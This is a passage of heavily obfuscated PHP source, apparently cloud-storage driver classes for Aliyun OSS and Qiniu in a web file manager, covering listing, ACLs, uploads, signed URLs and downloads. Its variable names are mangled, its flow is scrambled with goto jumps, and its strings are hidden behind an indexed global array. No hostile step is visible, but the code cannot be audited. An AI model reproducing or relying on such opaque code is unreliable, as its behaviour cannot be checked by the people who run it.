$Aé¦Ì¡º©·[$d—øä¶ÇÜ[85]][$bÊ¸£²ùØò] = $this->folderInfo($eß¡šá„ª, $eÂƒĞÃµ, $eß¡šá„ª); } foreach ($Aé¦Ì¡º©·[$d—øä¶ÇÜ[84]] as $bÊ¸£²ùØò => $eß¡šá„ª) { $Aé¦Ì¡º©·[$d—øä¶ÇÜ[84]][$bÊ¸£²ùØò] = $this->fileInfo($eß¡šá„ª[$d—øä¶ÇÜ[38]], $eÂƒĞÃµ, $eß¡šá„ª); } return $Aé¦Ì¡º©·; } public function has($Cö¥îßÙòù, $C°¿©À¶ØÃ = false, $E¯àƒ„¬šª = true) { goto cÈ‰”˜¡Šğ; cÈ‰”˜¡Šğ: $b÷¾ÕĞ™µ =& $_SERVER[œÕÊİğö]; $Cö¥îßÙòù = trim($Cö¥îßÙòù, $b÷¾ÕĞ™µ[8]); $DÄäŒõññ¬ = empty($Cö¥îßÙòù) && $Cö¥îßÙòù !== $b÷¾ÕĞ™µ[201] ? $b÷¾ÕĞ™µ[43] : $Cö¥îßÙòù . $b÷¾ÕĞ™µ[8]; goto cì×·ºŒšì; f´ÂóÃ­±˜: while (!0) { check_abort(); $dµ¹ä¾£Šª = array($b÷¾ÕĞ™µ[1293] => $b÷¾ÕĞ™µ[8], $b÷¾ÕĞ™µ[1294] => $DÄäŒõññ¬, $b÷¾ÕĞ™µ[1295] => $a­»§ì‡, $b÷¾ÕĞ™µ[1296] => $dÕ¬”öô®ñ); try { $F‰ã»¦¿ˆù = $this->client->listObjects($this->bucket, $dµ¹ä¾£Šª); } catch (OSS\Core\OssException $cÌ‰®ƒƒ“´) { break; } $dÕ¬”öô®ñ = $F‰ã»¦¿ˆù->getNextMarker(); $d”‹¸¼©Ùõ = $F‰ã»¦¿ˆù->getObjectList(); $B²…÷”Ôã‹ = $F‰ã»¦¿ˆù->getPrefixList(); if ($C°¿©À¶ØÃ) { if (count($d”‹¸¼©Ùõ) > 1 || count($d”‹¸¼©Ùõ) == 1 && $d”‹¸¼©Ùõ[0]->getKey() != $DÄäŒõññ¬) { $D…×” ·Úé += count($d”‹¸¼©Ùõ) - 1; } if (!empty($B²…÷”Ôã‹)) { $b‘«——²¥… += count($B²…÷”Ôã‹); } if ($dÕ¬”öô®ñ === $b÷¾ÕĞ™µ[43]) { break; } continue; } if ($E¯àƒ„¬šª) { if (!empty($d”‹¸¼©Ùõ)) { if (count($d”‹¸¼©Ùõ) > 1 || $d”‹¸¼©Ùõ[0]->getKey() != $DÄäŒõññ¬) { return !0; } } } else { if (!empty($B²…÷”Ôã‹)) { return !0; } } if ($dÕ¬”öô®ñ === $b÷¾ÕĞ™µ[43]) { break; } } if ($C°¿©À¶ØÃ) { return array($b÷¾ÕĞ™µ[213] => $D…×” ·Úé, $b÷¾ÕĞ™µ[214] => $b‘«——²¥…); } return !1; goto eäÚÎ­ÅÍö; cì×·ºŒšì: $dÕ¬”öô®ñ = $b÷¾ÕĞ™µ[43]; $a­»§ì‡ = 500; $D…×” ·Úé = $b‘«——²¥… = 0; goto f´ÂóÃ­±˜; eäÚÎ­ÅÍö: } public function listAll($cùˆš³Í³‹) { $dİ° Í½Âî =& $_SERVER[œÕÊİğö]; $fÃ“£·åŠé = $this->fileList($cùˆš³Í³‹, $dİ° Í½Âî[43], !0); $C¥ÂŠ™Æ© = array(); foreach ($fÃ“£·åŠé[$dİ° Í½Âî[84]] as $F—®Š¡Ş™) { $C¥ÂŠ™Æ©[$F—®Š¡Ş™[$dİ° Í½Âî[38]]] = $F—®Š¡Ş™[$dİ° Í½Âî[88]]; } foreach ($fÃ“£·åŠé[$dİ° Í½Âî[85]] as $F—®Š¡Ş™) { if (is_string($F—®Š¡Ş™)) { $C¥ÂŠ™Æ©[$F—®Š¡Ş™] = 0; } } return $this->listAllFiles($cùˆš³Í³‹, array_keys($C¥ÂŠ™Æ©), $C¥ÂŠ™Æ©); } public function canRead($a—Ê¶á¢ÁŠ) { $Aˆ™¸ˆ‡£º =& $_SERVER[œÕÊİğö]; $BæÅÔ°Æ  = $this->pathAcl($a—Ê¶á¢ÁŠ); return $BæÅÔ°Æ  == $Aˆ™¸ˆ‡£º[1306] || $BæÅÔ°Æ  == $Aˆ™¸ˆ‡£º[553] ? !0 : !1; } public function canWrite($Cù÷Ü‹³°) { $A»±à‚Å¿¡ = $this->pathAcl($Cù÷Ü‹³°); return $A»±à‚Å¿¡ == $_SERVER[œÕÊİğö][553] ? !0 : !1; } public function pathAcl($bÛÃéÄ”–´) { goto b¾“”ÄèĞ; b¾“”ÄèĞ: $bùõ¤÷»òî =& $_SERVER[œÕÊİğö]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $eâñ‚ÊÔÜš = $this->client->getObjectAcl($this->bucket, $this->pathEncode($bÛÃéÄ”–´)); } catch (OSS\Core\OssException $dòë—Üø„) { return !1; } goto b¨ŸÙ˜çà; E¿¢¾÷¸Â: return $f¤Ó£Öëì¾; goto F¥ìç”ÀôÊ; b¨ŸÙ˜çà: $f¤Ó£Öëì¾ = $eâñ‚ÊÔÜš == $bùõ¤÷»òî[44] ? $this->bucketAcl : $eâñ‚ÊÔÜš; if ($f¤Ó£Öëì¾ == $bùõ¤÷»òî[1307]) { return $bùõ¤÷»òî[1306]; } if ($f¤Ó£Öëì¾ == $bùõ¤÷»òî[1308]) { return $bùõ¤÷»òî[553]; } goto E¿¢¾÷¸Â; F¥ìç”ÀôÊ: } private function chmodPath($Fæ‡±ÎË¦, $aâÂ»¨ÈÂ = '') { $c™™Æ³ˆ£  =& $_SERVER[œÕÊİğö]; $f©‹ĞæÕ¾Í = empty($aâÂ»¨ÈÂ) ? $c™™Æ³ˆ£ [1308] : $aâÂ»¨ÈÂ; $B¿¡ö©ÙÏô = array($c™™Æ³ˆ£ [44], $c™™Æ³ˆ£ [202], $c™™Æ³ˆ£ [1307], $c™™Æ³ˆ£ [1308]); if (!in_array($f©‹ĞæÕ¾Í, $B¿¡ö©ÙÏô)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($Fæ‡±ÎË¦), $f©‹ĞæÕ¾Í); } catch (OSS\Core\OssException $e÷¥ºè‰ã¯) { return !1; } return !0; } public function getContent($BßÑ¾í¶øŒ) { return $this->fileSubstr($BßÑ¾í¶øŒ, -1); } public function setContent($a˜éƒĞ›¶Æ, $A¸³ªï¢â‘ = '') { $e¹±Æ¯˜Ú÷ =& $_SERVER[œÕÊİğö]; try { $a­†´ÍŠò½ = $this->trafficLimit($e¹±Æ¯˜Ú÷[1309]); $Dõ˜®×ñ±¨ = $this->client->putObject($this->bucket, $this->pathEncode($a˜éƒĞ›¶Æ), $A¸³ªï¢â‘, $a­†´ÍŠò½); } catch (OSS\Core\OssException $DğáÒì‚©è) { return !1; } $fÕ¾ƒçâ’Ì = array($e¹±Æ¯˜Ú÷[1299] => trim($Dõ˜®×ñ±¨[$e¹±Æ¯˜Ú÷[1310]], $e¹±Æ¯˜Ú÷[126]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($a˜éƒĞ›¶Æ))); $this->updateObjMeta($a˜éƒĞ›¶Æ, $fÕ¾ƒçâ’Ì); return isset($Dõ˜®×ñ±¨[$e¹±Æ¯˜Ú÷[1311]][$e¹±Æ¯˜Ú÷[1258]]) ? !0 : !1; } private function updateObjMeta($a‹½²Ğ·²¬, $C¾¼Ê³º­) { $a‹½²Ğ·²¬ = $this->pathEncode($a‹½²Ğ·²¬); try { $B¶È½… ëÖ = array(OSS\OssClient::OSS_HEADERS => $C¾¼Ê³º­); $this->client->copyObject($this->bucket, $a‹½²Ğ·²¬, $this->bucket, $a‹½²Ğ·²¬, $B¶È½… ëÖ); } catch (OSS\Core\OssException $e¯„é ÄÃˆ) { return !1; } return !0; } public function upload($D“ğ±Á¸ó, $eÕìÀ¦šŞ¨, $eàˆŞŒ¯¾ = false, $D¦ÏÜãŸ¥ = REPEAT_REPLACE) { $fô£°ÑÕ§¡ =& $_SERVER[œÕÊİğö]; $AÎ‹®²í„ = trim($D“ğ±Á¸ó, $fô£°ÑÕ§¡[8]); $AÉãˆ¤£Ğö = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($fô£°ÑÕ§¡[1299] => @md5_file($eÕìÀ¦šŞ¨)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($D“ğ±Á¸ó))); $AÉãˆ¤£Ğö = $this->trafficLimit($fô£°ÑÕ§¡[1309], $AÉãˆ¤£Ğö); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($AÎ‹®²í„), $eÕìÀ¦šŞ¨, $AÉãˆ¤£Ğö); } catch (OSS\Core\OssException $E½òÑÛ‘ãò) { return !1; } return $this->getPathOuter($D“ğ±Á¸ó); } public function getHost() { $f ÎÒ•¿Ú½ =& $_SERVER[œÕÊİğö]; $f½ÊËÙÙÂ§ = explode($f ÎÒ•¿Ú½[187], parent::getHost()); return $f½ÊËÙÙÂ§[0] . $f ÎÒ•¿Ú½[187] . $this->bucket . $f ÎÒ•¿Ú½[105] . $f½ÊËÙÙÂ§[1]; } public function uploadFormData($D½¡Ş­á‡š, $Eœß¿«‰Ïö = 3600) { goto dÓù‹•Ÿáİ; FËÓç‚áÇƒ: $cç–Ü­Ô®æ = base64_encode(hash_hmac($a«ˆô²Ì‰[239], $E‰ÜŞªÖò, $this->secret, !0)); $FÃÎ›¶¶ªÖ = array($a«ˆô²Ì‰[1223] => $E‰ÜŞªÖò, $a«ˆô²Ì‰[1315] => $this->accessKey, $a«ˆô²Ì‰[1219] => $a«ˆô²Ì‰[1211], $a«ˆô²Ì‰[1316] => $cç–Ü­Ô®æ, $a«ˆô²Ì‰[185] => $EÇÒÊØš‹Ò); $FÃÎ›¶¶ªÖ = $this->trafficLimit($a«ˆô²Ì‰[1309], $FÃÎ›¶¶ªÖ); goto AÆ¬â²”¨ò; dÓù‹•Ÿáİ: $a«ˆô²Ì‰ =& $_SERVER[œÕÊİğö]; if (!($EÇÒÊØš‹Ò = $this->getHost())) { return !1; } $aõÆ…èŒˆ = $Eœß¿«‰Ïö; goto d¤ë¸¤âÀ‰; d¤ë¸¤âÀ‰: $B³·À…® = date($a«ˆô²Ì‰[1312], time() + $aõÆ…èŒˆ); $E“¡ù÷Í‡ = new DateTime($B³·À…®); $D ÊÁŠïˆ¿ = $E“¡ù÷Í‡->format(DateTime::ISO8601); goto fÏã»–„¾; CÒŞ“âÊÒÛ: $dòê¬ˆ³ = $this->pathFather($D½¡Ş­á‡š); $E‹´„è©Òº = array($a«ˆô²Ì‰[1213] => $D ÊÁŠïˆ¿, $a«ˆô²Ì‰[1214] => array(array($a«ˆô²Ì‰[1314], 0, $C”Ì°‚˜æØ), array($a«ˆô²Ì‰[1217], $a«ˆô²Ì‰[1218], $dòê¬ˆ³))); $E‰ÜŞªÖò = base64_encode(json_encode($E‹´„è©Òº)); goto FËÓç‚áÇƒ; AÆ¬â²”¨ò: return $FÃÎ›¶¶ªÖ; goto b‰·Ç²å; fÏã»–„¾: $dâŒ»ªâë = strpos($D ÊÁŠïˆ¿, $a«ˆô²Ì‰[304]); $D ÊÁŠïˆ¿ = substr($D ÊÁŠïˆ¿, 0, $dâŒ»ªâë) . $a«ˆô²Ì‰[1313]; $C”Ì°‚˜æØ = 1048576000 * 5; goto CÒŞ“âÊÒÛ; b‰·Ç²å: } public function multiUploadFormData($F÷„‡ÆŠÊ, $B³Í äì½‘ = 3600) { $bõº‚©óÕé =& $_SERVER[œÕÊİğö]; if (!($C”•ºÍÓöğ = $this->getHost())) { return !1; } $bÍ™ ÁÇ² = $this->trafficLimit($bõº‚©óÕé[1309]); $càâ£“Ÿï§ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($F÷„‡ÆŠÊ), $bÍ™ ÁÇ²); return array($bõº‚©óÕé[231] => $càâ£“Ÿï§, $bõº‚©óÕé[185] => $C”•ºÍÓöğ . $bõº‚©óÕé[8] . $this->pathEncode($F÷„‡ÆŠÊ), $bõº‚©óÕé[232] => gmdate($bõº‚©óÕé[1317]), $bõº‚©óÕé[103] => $F÷„‡ÆŠÊ); } public function multiUploadAuthData($b»©‰‚°àø, $bŒ÷ìŠ‚ˆ = array()) { goto cèòòˆÙ; cèòòˆÙ: $aŠØÃ„µÃ =& $_SERVER[œÕÊİğö]; $a»ÜÀŠ«¬é = isset($bŒ÷ìŠ‚ˆ[$aŠØÃ„µÃ[232]]) ? $bŒ÷ìŠ‚ˆ[$aŠØÃ„µÃ[232]] : gmdate($aŠØÃ„µÃ[1317]); $dî™èîŠ‘Ó = isset($bŒ÷ìŠ‚ˆ[$aŠØÃ„µÃ[178]]) ? $bŒ÷ìŠ‚ˆ[$aŠØÃ„µÃ[178]] : $aŠØÃ„µÃ[43]; goto d…ä«““ñø; d…ä«““ñø: $b’®ø¤¡›™ = $b»©‰‚°àø; if (isset($bŒ÷ìŠ‚ˆ[$aŠØÃ„µÃ[103]])) { $b’®ø¤¡›™ = $bŒ÷ìŠ‚ˆ[$aŠØÃ„µÃ[103]]; unset($bŒ÷ìŠ‚ˆ[$aŠØÃ„µÃ[103]]); } if (isset($bŒ÷ìŠ‚ˆ[$aŠØÃ„µÃ[233]])) { $bŒ÷ìŠ‚ˆ[$aŠØÃ„µÃ[232]] = $a»ÜÀŠ«¬é; return $this->listUploadParts($b’®ø¤¡›™, $bŒ÷ìŠ‚ˆ); } goto dÕëÊœÑ±°; dÕëÊœÑ±°: $FÂ©‡×ÔÂ = array($aŠØÃ„µÃ[234], $aŠØÃ„µÃ[43], $aŠØÃ„µÃ[129], $a»ÜÀŠ«¬é, "\170\55\157\163\x73\55\x64\x61\164\x65\72{$a»ÜÀŠ«¬é}", $aŠØÃ„µÃ[8] . $this->bucket . $aŠØÃ„µÃ[8] . $b’®ø¤¡›™ . $dî™èîŠ‘Ó); if (strpos($dî™èîŠ‘Ó, $aŠØÃ„µÃ[235]) === 0) { $FÂ©‡×ÔÂ[0] = $aŠØÃ„µÃ[236]; if ($Fçëù¢ùÀÉ = $this->trafficLimit($aŠØÃ„µÃ[1309])) { $b’®ø¤¡›™ = $aŠØÃ„µÃ[1318]; array_splice($FÂ©‡×ÔÂ, 5, 0, $b’®ø¤¡›™ . $aŠØÃ„µÃ[4] . $Fçëù¢ùÀÉ[$b’®ø¤¡›™]); } } if (isset($bŒ÷ìŠ‚ˆ[$aŠØÃ„µÃ[237]]) && $bŒ÷ìŠ‚ˆ[$aŠØÃ„µÃ[237]] == $aŠØÃ„µÃ[238]) { $FÂ©‡×ÔÂ[0] = $aŠØÃ„µÃ[238]; } goto B‚ğŞï³„ğ; a‰©Ã»: $Fº¼éÄŠ ƒ = $aŠØÃ„µÃ[1283] . $this->accessKey . $aŠØÃ„µÃ[4] . $FŠñóØËä‰; if (strpos($dî™èîŠ‘Ó, $aŠØÃ„µÃ[235]) === 0) { $Fº¼éÄŠ ƒ = array($aŠØÃ„µÃ[241] => $Fº¼éÄŠ ƒ, $aŠØÃ„µÃ[232] => $a»ÜÀŠ«¬é); if ($Fçëù¢ùÀÉ) { $Fº¼éÄŠ ƒ = array_merge($Fº¼éÄŠ ƒ, $Fçëù¢ùÀÉ); } } return $Fº¼éÄŠ ƒ; goto f£‘ìò§œŞ; B‚ğŞï³„ğ: if (!empty($bŒ÷ìŠ‚ˆ[$aŠØÃ„µÃ[1319]])) { $c¾ÅçÒ™ã— = array_merge(array($FÂ©‡×ÔÂ[4]), $bŒ÷ìŠ‚ˆ[$aŠØÃ„µÃ[1319]]); sort($c¾ÅçÒ™ã—); $FÂ©‡×ÔÂ[4] = implode($aŠØÃ„µÃ[15], $c¾ÅçÒ™ã—); } $C·®ÌÎÀ³Ş = implode($aŠØÃ„µÃ[15], $FÂ©‡×ÔÂ); $FŠñóØËä‰ = base64_encode(hash_hmac($aŠØÃ„µÃ[239], $C·®ÌÎÀ³Ş, $this->secret, !0)); goto a‰©Ã»; f£‘ìò§œŞ: } public function listUploadParts($fÏÏ“ÑòÂ¾, $aå¥ï£®ˆà) { goto e“èğ×Š˜¤; e“èğ×Š˜¤: $cò²×ÉøšŠ =& $_SERVER[œÕÊİğö]; $eÒÖŸÀŸ©é = parse_url_query($aå¥ï£®ˆà[$cò²×ÉøšŠ[178]]); $fËƒ™ñÀ®Ÿ = $this->client->listParts($this->bucket, $this->pathEncode($fÏÏ“ÑòÂ¾), $eÒÖŸÀŸ©é[$cò²×ÉøšŠ[231]]); goto F ¸¤“ø®‹; AÊĞ¤ºŒÖ: return array($cò²×ÉøšŠ[241] => $DŸÚìöñ², $cò²×ÉøšŠ[232] => $aå¥ï£®ˆà[$cò²×ÉøšŠ[232]], $cò²×ÉøšŠ[243] => $Aã”õô‹›Š); goto f¾Ã—â¤ñ¢; CèøÆ©ÕìÍ: unset($aå¥ï£®ˆà[$cò²×ÉøšŠ[233]], $aå¥ï£®ˆà[$cò²×ÉøšŠ[237]]); $DŸÚìöñ² = $this->multiUploadAuthData($fÏÏ“ÑòÂ¾, $aå¥ï£®ˆà); if (empty($DŸÚìöñ²)) { return !1; } goto AÊĞ¤ºŒÖ; F ¸¤“ø®‹: $Aˆîè¨ÜÀ› = $fËƒ™ñÀ®Ÿ->getListPart(); $Aã”õô‹›Š = array(); foreach ($Aˆîè¨ÜÀ› as $eá™Éœİå´) { $Aã”õô‹›Š[] = array($cò²×ÉøšŠ[1303] => $eá™Éœİå´->getPartNumber(), $cò²×ÉøšŠ[1304] => trim($eá™Éœİå´->getETag(), $cò²×ÉøšŠ[126])); } goto CèøÆ©ÕìÍ; f¾Ã—â¤ñ¢: } public function download($báäáÀÓ‰, $bŠ¸ìš˜Œ) { if ($this->isFolder($báäáÀÓ‰)) { return !1; } try { $bŞˆºĞ††… = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $bŠ¸ìš˜Œ); $bŞˆºĞ††… = $this->trafficLimit($_SERVER[œÕÊİğö][119], $bŞˆºĞ††…); $this->client->getObject($this->bucket, $this->pathEncode($báäáÀÓ‰), $bŞˆºĞ††…); } catch (OSS\Core\OssException $A£‡¬ªË’º) { return !1; } return $bŠ¸ìš˜Œ; } public function fileSubstr($c¨…Ï£Ò, $eÄƒğ…àŞ = 0, $Bîùš°Çˆ = false) { if ($eÄƒğ…àŞ === -1) { $AàâÏ²§ÀÚ = array(); } else { if ($Bîùš°Çˆ === !1) { $BßßËŠâ£ = $this->size($c¨…Ï£Ò); } else { $BßßËŠâ£ = $eÄƒğ…àŞ + $Bîùš°Çˆ - 1; } $AàâÏ²§ÀÚ = array(OSS\OssClient::OSS_RANGE => "{$eÄƒğ…àŞ}\x2d{$BßßËŠâ£}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($c¨…Ï£Ò), $AàâÏ²§ÀÚ); } catch (OSS\Core\OssException $D«ÄŠä¤ºµ) { think_exception($D«ÄŠä¤ºµ->getMessage()); return !1; } } private function trafficLimit($E®ŒÍ»óÇÊ, $bß÷¤Ô§ùã = array()) { goto cç¢·•Ö“; cç¢·•Ö“: $A¢®–·Ï·¡ =& $_SERVER[œÕÊİğö]; if ($E®ŒÍ»óÇÊ == $A¢®–·Ï·¡[1309] && $this->isUploadServer() || $E®ŒÍ»óÇÊ == $A¢®–·Ï·¡[119] && $this->isFileOutServer()) { return $bß÷¤Ô§ùã; } $dŒ«É§áª» = floatval($GLOBALS[$A¢®–·Ï·¡[6]][$A¢®–·Ï·¡[98]][$A¢®–·Ï·¡[117]][$E®ŒÍ»óÇÊ]) * 1024 * 1024 * 8; goto bß·¾çÅº; c«ÂµÉºÚ: return $bß÷¤Ô§ùã; goto E½±ğ§Ù”; bß·¾çÅº: if (!$dŒ«É§áª») { return $bß÷¤Ô§ùã; } $dŒ«É§áª» = $dŒ«É§áª» < 819200 ? 819200 : ($dŒ«É§áª» > 838860800 ? 838860800 : $dŒ«É§áª»); $bß÷¤Ô§ùã[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($dŒ«É§áª»); goto c«ÂµÉºÚ; E½±ğ§Ù”: } public function link($bˆ‰øÙÜÂ, $F¯İš‘˜´à = array()) { $D¸Æ‚¦¦ =& $_SERVER[œÕÊİğö]; if (!$this->exist($bˆ‰øÙÜÂ) || $this->isFolder($bˆ‰øÙÜÂ)) { return !1; } try { $F¯İš‘˜´à = $this->trafficLimit($D¸Æ‚¦¦[119], $F¯İš‘˜´à); $B©ÈåìÙÂ = $this->client->signUrl($this->bucket, $this->pathEncode($bˆ‰øÙÜÂ), 3600 * 12, $D¸Æ‚¦¦[238], $F¯İš‘˜´à); return $this->getCdnLink($B©ÈåìÙÂ); } catch (OSS\Core\OssException $E’‡¼»í¡ë) { return !1; } } public function fileOut($C‹ã÷±ÌÏ, $e£Ø©²ßÜÌ = false, $Aƒô†‰Šš´ = false, $Aß¹‹·‘Û = '') { goto FØùğØÌ†Ê; FØùğØÌ†Ê: $CŠœß¥Øéß =& $_SERVER[œÕÊİğö]; if ($this->isFileOutServer()) { return $this->fileOutServer($C‹ã÷±ÌÏ, $e£Ø©²ßÜÌ, $Aƒô†‰Šš´, $Aß¹‹·‘Û); } if (!$Aƒô†‰Šš´) { $Aƒô†‰Šš´ = $this->pathThis($C‹ã÷±ÌÏ); } goto DŸ¹ê¿„Êß; dˆõ©Ğ³Â: $f«Û¼©µäˆ = $this->link($C‹ã÷±ÌÏ, $fã‘ÚŸ±óÂ); $this->fileOutLink($f«Û¼©µäˆ); goto EŒˆ³µ–Ÿ; bï»œµ: $e£Ø©²ßÜÌ = $e£Ø©²ßÜÌ ? $CŠœß¥Øéß[224] : $CŠœß¥Øéß[225]; $fã‘ÚŸ±óÂ = array(OSS\OssClient::OSS_SUB_RESOURCE => $CŠœß¥Øéß[1320] . rawurlencode("{$e£Ø©²ßÜÌ}\x3b\146\151\x6c\x65\x6e\141\x6d\145\x3d{$Aƒô†‰Šš´}")); $fã‘ÚŸ±óÂ[OSS\OssClient::OSS_SUB_RESOURCE] .= $CŠœß¥Øéß[1321] . rawurlencode($D£æâÑ¼ÍË); goto dˆõ©Ğ³Â; DŸ¹ê¿„Êß: $Aƒô†‰Šš´ = rawurlencode($Aƒô†‰Šš´); $D£æâÑ¼ÍË = get_file_mime(get_path_ext($Aƒô†‰Šš´)); if ($D£æâÑ¼ÍË == $CŠœß¥Øéß[223]) { return parent::fileOut($C‹ã÷±ÌÏ, $e£Ø©²ßÜÌ, $Aƒô†‰Šš´, $Aß¹‹·‘Û); } goto bï»œµ; EŒˆ³µ–Ÿ: } public function fileOutServer($c¼™Ô‘Ëò, $b¿®¨×²‚ì = false, $dŞéŒöò– = false, $fòíÛ¤Õ = '') { parent::fileOut($c¼™Ô‘Ëò, $b¿®¨×²‚ì, $dŞéŒöò–, $fòíÛ¤Õ); } public function fileOutImage($A‚¿Š†¿î, $Eå˜­‘Œ¹ = 250) { $b¿¾“™÷Ò = array(OSS\OssClient::OSS_PROCESS => $_SERVER[œÕÊİğö][1322] . $Eå˜­‘Œ¹); $fîÚÃÒƒšœ = $this->link($A‚¿Š†¿î, $b¿¾“™÷Ò); $this->fileOutLink($fîÚÃÒƒšœ); } public function fileOutImageServer($CˆŸìøÔ £, $BÍ‹Ÿ±™Ñ² = 250) { parent::fileOutImage($CˆŸìøÔ £, $BÍ‹Ÿ±™Ñ²); } public function fileOutLink($A÷ƒ–“‚í») { $BŒİ•İ×ƒ =& $_SERVER[œÕÊİğö]; if (!$this->isCdnHost() && substr($A÷ƒ–“‚í», 0, 7) == $BŒİ•İ×ƒ[1226]) { $A÷ƒ–“‚í» = $BŒİ•İ×ƒ[1227] . substr($A÷ƒ–“‚í», 7); } header($BŒİ•İ×ƒ[169] . $A÷ƒ–“‚í»); die; } public function hashMd5($BİÕ‹‹½ò¨, $eÉä……”Ş = '') { $fÍâ…Š§ô =& $_SERVER[œÕÊİğö]; $aŞÈª†•–¤ = $this->_objectMeta($BİÕ‹‹½ò¨); if (!$aŞÈª†•–¤) { return $fÍâ…Š§ô[43]; } if (!isset($aŞÈª†•–¤[$fÍâ…Š§ô[1299]]) && !empty($eÉä……”Ş)) { $Aäôà ÄÂè = $this->updateObjMeta($BİÕ‹‹½ò¨, array($fÍâ…Š§ô[1299] => $eÉä……”Ş)); $aŞÈª†•–¤[$fÍâ…Š§ô[1299]] = $Aäôà ÄÂè ? $eÉä……”Ş : $fÍâ…Š§ô[43]; } return isset($aŞÈª†•–¤[$fÍâ…Š§ô[1299]]) ? strtolower($aŞÈª†•–¤[$fÍâ…Š§ô[1299]]) : $fÍâ…Š§ô[43]; } public function size($FË±Ë¾ÆÃ×) { $cáˆÔÓéÖ‰ = $this->objectMeta($FË±Ë¾ÆÃ×); return $cáˆÔÓéÖ‰ ? $cáˆÔÓéÖ‰[$_SERVER[œÕÊİğö][88]] : 0; } public function info($cÆ”Ç¥’Ş°) { if ($this->isFolder($cÆ”Ç¥’Ş°)) { return $this->folderInfo($cÆ”Ç¥’Ş°); } else { if ($this->isFile($cÆ”Ç¥’Ş°)) { return $this->fileInfo($cÆ”Ç¥’Ş°); } } return !1; } public function exist($fÒØÓø¢õ) { return $this->isFile($fÒØÓø¢õ) || $this->isFolder($fÒØÓø¢õ); } public function isFile($Eê¡¡ø–’Ş) { return !$this->isFolder($Eê¡¡ø–’Ş) && $this->objectMeta($Eê¡¡ø–’Ş); } public function isFolder($AêŒÓ‹µº) { return $this->cacheMethod($_SERVER[œÕÊİğö][209], $AêŒÓ‹µº); } protected function objectMeta($BèæÓçÔÓ¡) { return $this->cacheMethod($_SERVER[œÕÊİğö][210], $BèæÓçÔÓ¡); } protected function _objectMeta($cƒº•„¶») { $Cø¹©©Ã´ =& $_SERVER[œÕÊİğö]; try { $a‰áæ¾äœ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($cƒº•„¶»)); } catch (OSS\Core\OssException $EÓ²·ÑÍá±) { $a‰áæ¾äœ = !1; } if ($a‰áæ¾äœ) { $a‰áæ¾äœ[$Cø¹©©Ã´[88]] = intval($a‰áæ¾äœ[$Cø¹©©Ã´[1297]]); } return $a‰áæ¾äœ; } protected function _isFolder($aÚ¾¾ÖÌ°) { $C×õàé²´ =& $_SERVER[œÕÊİğö]; if ($aÚ¾¾ÖÌ° == $C×õàé²´[43] || $aÚ¾¾ÖÌ° == $C×õàé²´[8]) { return !0; } $dí‚ˆ„Ü×¤ = array($C×õàé²´[1293] => $C×õàé²´[8], $C×õàé²´[1294] => rtrim($aÚ¾¾ÖÌ°, $C×õàé²´[8]) . $C×õàé²´[8], $C×õàé²´[1295] => 1, $C×õàé²´[1296] => $C×õàé²´[43]); $bÓº¢†êå˜ = $this->client->listObjects($this->bucket, $dí‚ˆ„Ü×¤); if ($bÓº¢†êå˜->getObjectList() || $bÓº¢†êå˜->getPrefixList()) { return !0; } return !1; } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public function __construct($EĞè†›ïº) { parent::__construct(); require_once SDK_DIR . $_SERVER[œÕÊİğö][1323]; $this->_init($EĞè†›ïº); } public function _init($DÏ°Ï×ŒŠÛ) { goto C¤–ÃÖ¸¶; B¯Üì¹¬Õ”: $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); goto A©ªôˆƒÖ; A Ì™ŒÉœ‹: $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); goto B¯Üì¹¬Õ”; C¤–ÃÖ¸¶: $Bê™šÂÙŸÑ =& $_SERVER[œÕÊİğö]; foreach ($DÏ°Ï×ŒŠÛ as $fŞÖˆ’êõ× => $f¶†»ôÈÆò) { if (isset($this->{$fŞÖˆ’êõ×})) { $this->{$fŞÖˆ’êõ×} = $f¶†»ôÈÆò; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($Bê™šÂÙŸÑ[1324] . LNG($Bê™šÂÙŸÑ[1284])); } goto A Ì™ŒÉœ‹; A©ªôˆƒÖ: } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($CÀ½·±É›, $Fƒ°ÍÏ“›ù = '', $D®–šõë¾ = REPEAT_RENAME) { if ($this->setContent($CÀ½·±É›, $Fƒ°ÍÏ“›ù)) { return $this->getPathOuter($CÀ½·±É›); } return !1; } public function mkdir($CËÏÉ§ã‘…, $C»âİì’õÈ = REPEAT_SKIP) { goto A¹÷Á­¢ö; A¹÷Á­¢ö: $E„ƒ·›ëµ =& $_SERVER[œÕÊİğö]; $CùŞÊ‚¦õ = trim($CËÏÉ§ã‘…, $E„ƒ·›ëµ[8]); if ($this->_isFolder($CùŞÊ‚¦õ)) { return $this->getPathOuter($CùŞÊ‚¦õ); } goto Aßä¾â®¤¹; Aßä¾â®¤¹: $CËÏÉ§ã‘… = $CùŞÊ‚¦õ . $E„ƒ·›ëµ[8]; $Fò²¤¿Ÿ§› = get_path_this($CùŞÊ‚¦õ); $A†Ó©Ú·Ó = $CËÏÉ§ã‘… . $Fò²¤¿Ÿ§›; goto a»«¬©î­; a»«¬©î­: if (!$this->mkfile($A†Ó©Ú·Ó)) { return !1; } if (!$this->moveFile($A†Ó©Ú·Ó, $CËÏÉ§ã‘…)) { $this->delFile($A†Ó©Ú·Ó); return !1; } return $this->getPathOuter($CùŞÊ‚¦õ); goto a«Ó÷³ÔßÈ; 